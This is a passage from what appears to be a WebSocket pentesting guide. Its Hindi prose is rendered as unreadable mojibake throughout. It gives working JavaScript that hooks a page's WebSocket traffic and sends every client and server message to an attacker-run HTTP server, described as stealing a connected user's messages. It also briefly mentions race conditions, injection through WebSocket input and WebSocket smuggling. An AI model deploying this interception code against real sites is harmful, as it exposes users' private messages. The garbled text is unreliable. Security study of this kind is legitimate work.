//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
рдЕрдм [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) рд╕реЗ `wsHook.js` рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ рдФрд░ **рд╡реЗрдм рдлрд╝рд╛рдЗрд▓реЛрдВ рд╡рд╛рд▓реЗ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд╕рд╣реЗрдЬреЗрдВ**ред\
рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рдХреЗ рдФрд░ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЗрд╕рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рд╛рдиреЗ рд╕реЗ рдЖрдк websocket рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬреЗ рдЧрдП рдФрд░ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЧрдП рд╕рдВрджреЗрд╢ рдЪреБрд░рд╛ рд╕рдХреЗрдВрдЧреЗ:
```javascript
sudo python3 -m http.server 80
```
## рд░реЗрд╕ рдХрдВрдбреАрд╢рди

рд╡реЗрдмрд╕реЙрдХреЗрдЯреНрд╕ рдореЗрдВ рд░реЗрд╕ рдХрдВрдбреАрд╢рди рднреА рдПрдХ рдЪреАрдЬ рд╣реИ, [рдЕрдзрд┐рдХ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣ рдЬрд╛рдирдХрд╛рд░реА рджреЗрдЦреЗрдВ](race-condition.md#rc-in-websockets)ред

## рдЕрдиреНрдп рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖

рд╡реЗрдм рд╕реЙрдХреЗрдЯреНрд╕ рдПрдХ рддрдВрддреНрд░ рд╣реИрдВ **рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдФрд░ рдХреНрд▓рд╛рдЗрдВрдЯ рд╕рд╛рдЗрдб рдХреЛ рдбреЗрдЯрд╛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП**, рдЬрд┐рд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд╕рд░реНрд╡рд░ рдФрд░ рдХреНрд▓рд╛рдЗрдВрдЯ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдХреИрд╕реЗ рд╕рдВрднрд╛рд▓рддреЗ рд╣реИрдВ, **рд╡реЗрдм рд╕реЙрдХреЗрдЯреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рд╕реА рднреА рдЖрдо рд╡реЗрдм рджреЛрд╖ рдЬреИрд╕реЗ XSS, SQLi рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рджреЛрд╖ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╡реЗрдмрд╕реЙрдХреЗрдЯ рд╕реЗ рдЗрдирдкреБрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред**

## **рд╡реЗрдмрд╕реЙрдХреЗрдЯ рд╕реНрдордЧреНрд▓рд┐рдВрдЧ**

рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдЖрдкрдХреЛ **рд░рд┐рд╡рд░реНрд╕ рдкреНрд░реЙрдХреНрд╕реА рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рдЙрд▓реНрд▓рдВрдШрди рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдпрд╣ рдорд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдПрдХ **рд╡реЗрдмрд╕реЙрдХреЗрдЯ рд╕рдВрдЪрд╛рд░ рд╕реНрдерд╛рдкрд┐рдд рд╣реЛ рдЧрдпрд╛ рдерд╛** (рдпрджрд┐ рдпрд╣ рд╕рдЪ рдирд╣реАрдВ рд╣реИ)ред рдЗрд╕рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ **рдЫрд┐рдкреА рд╣реБрдИ рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛ рд╕рдХрддреА рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## рд╕рдВрджрд░реНрдн

* [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)
